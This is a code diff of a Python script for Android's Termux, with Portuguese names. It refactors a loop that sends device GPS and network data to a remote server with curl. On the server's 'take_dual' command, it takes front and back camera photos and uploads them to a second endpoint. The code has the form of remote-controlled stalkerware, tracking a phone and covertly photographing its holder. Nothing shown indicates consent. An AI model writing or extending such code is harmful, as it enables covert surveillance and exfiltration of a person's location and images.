@@ -1,6 +1,7 @@
 import time
 import subprocess
 import json
+import requests
 import os
 import uuid
 import base64
@@ -64,17 +65,39 @@ def obter_gps():
         except: pass
     gps_ok = False
 
-def post_json(url, data, timeout=5):
-    """Usa CURL que respeita timeout no Termux"""
-    json_str = json.dumps(data).replace("'", "'\\''")
-    cmd = f"curl -s -X POST '{url}' -H 'Content-Type: application/json' -d '{json_str}' --connect-timeout {timeout} --max-time {timeout}"
-    resp = run(cmd, timeout=timeout+2)
+def enviar_dados(payload):
+    """Dados via CURL (rápido)"""
+    json_str = json.dumps(payload).replace("'", "'\\''")
+    cmd = f"curl -s -X POST '{URL_SERVIDOR}' -H 'Content-Type: application/json' -d '{json_str}' --connect-timeout 5 --max-time 5"
+    resp = run(cmd, timeout=6)
     try:
         return json.loads(resp)
     except:
         return None
 
-print("🛰️  INICIADO (curl)\n")
+def enviar_foto(tipo, num):
+    """Fotos via requests (aguenta base64 grande)"""
+    arq = os.path.expanduser(f"~/nexos_{tipo}.jpg")
+    if os.path.exists(arq):
+        os.remove(arq)
+    
+    try:
+        subprocess.run(f"termux-camera-photo -c {num} {arq}", shell=True, timeout=6)
+        time.sleep(1)
+        if os.path.exists(arq) and os.path.getsize(arq) > 100:
+            with open(arq, "rb") as f:
+                b64 = base64.b64encode(f.read()).decode('utf-8')
+            payload = {"device_id": DEVICE_ID, "tipo": tipo, "photo": b64}
+            r = requests.post(URL_UPLOAD_FOTO, json=payload, timeout=15)
+            os.remove(arq)
+            return r.status_code == 200
+    except:
+        pass
+    if os.path.exists(arq):
+        os.remove(arq)
+    return False
+
+print("🛰️  INICIADO (curl dados + requests fotos)\n")
 
 while True:
     t0 = time.time()
@@ -108,7 +131,7 @@ while True:
         "network": rede
     }
     
-    resp = post_json(URL_SERVIDOR, payload, timeout=5)
+    resp = enviar_dados(payload)
     
     dt = time.time() - t0
     icone = "📍" if gps_ok else "📡"
@@ -119,20 +142,11 @@ while True:
         
         if comando == "take_dual":
             print("📸 Capturando...")
-            for tipo, num in [("back",0), ("front",1)]:
-                arq = os.path.expanduser(f"~/nexos_{tipo}.jpg")
-                if os.path.exists(arq): os.remove(arq)
-                run(f"termux-camera-photo -c {num} {arq}", timeout=6)
-                time.sleep(1)
-                if os.path.exists(arq) and os.path.getsize(arq) > 100:
-                    with open(arq, "rb") as f:
-                        b64 = base64.b64encode(f.read()).decode('utf-8')
-                    fp = {"device_id": DEVICE_ID, "tipo": tipo, "photo": b64}
-                    r = post_json(URL_UPLOAD_FOTO, fp, timeout=10)
-                    print(f"   {'✅' if r else '❌'} {tipo}")
-                else:
-                    print(f"   ❌ {tipo}")
-                if os.path.exists(arq): os.remove(arq)
+            r1 = enviar_foto("back", 0)
+            print(f"   {'✅' if r1 else '❌'} Traseira")
+            time.sleep(0.5)
+            r2 = enviar_foto("front", 1)
+            print(f"   {'✅' if r2 else '❌'} Frontal")
     else:
         print(f"📡 [{datetime.now().strftime('%H:%M:%S')}] Offline | {dt:.1f}s")
     
